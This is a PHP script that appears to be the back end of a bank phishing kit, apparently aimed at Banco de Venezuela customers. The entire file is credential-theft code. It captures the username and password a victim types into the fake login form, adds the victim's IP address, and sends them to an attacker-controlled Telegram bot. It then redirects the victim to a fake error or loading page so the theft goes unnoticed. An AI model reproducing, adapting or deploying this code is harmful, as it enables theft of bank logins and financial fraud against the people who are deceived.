<?php
error_reporting(0);
require 'config.php';

// Función para obtener IP real
function obtenerIPreal() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Obtener la IP ANTES de cargar bloqueo.php
$ip = obtenerIPreal();

// Guardar IP como global para bloqueo.php (si lo necesita)
$GLOBALS['ip'] = $ip;

require 'bloqueo.php'; // Ahora $ip ya está definida antes

session_start();

$nombre = isset($_POST['nombre']) ? $_POST['nombre'] : '';
$contra = isset($_POST['contra']) ? $_POST['contra'] : '';

$_SESSION['nombre'] = $nombre;

// Enviar a Telegram si el nombre es solo números
if (is_numeric($nombre)) {
    $message = "BDV 🆕 \n\n👤Nombre: $nombre";
    if (!empty($contra)) {
        $message .= "\n🔑Contraseña: $contra";
    }
    $message .= "\n📍IP: $ip";

    file_get_contents("https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message));

    header('Location: error.php');
    exit();
}

// Enviar mensaje general
$message = "BDV 🆕 \n\n👤Nombre: $nombre";
if (!empty($contra)) {
    $message .= "\n🔑Contraseña: $contra";
}
$message .= "\n📍IP: $ip";

file_get_contents("https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message));

// Redirección
if (!empty($contra)) {
    header('Location: cargando.html');
    exit();
} else {
    echo "Nombre enviado";
}
?>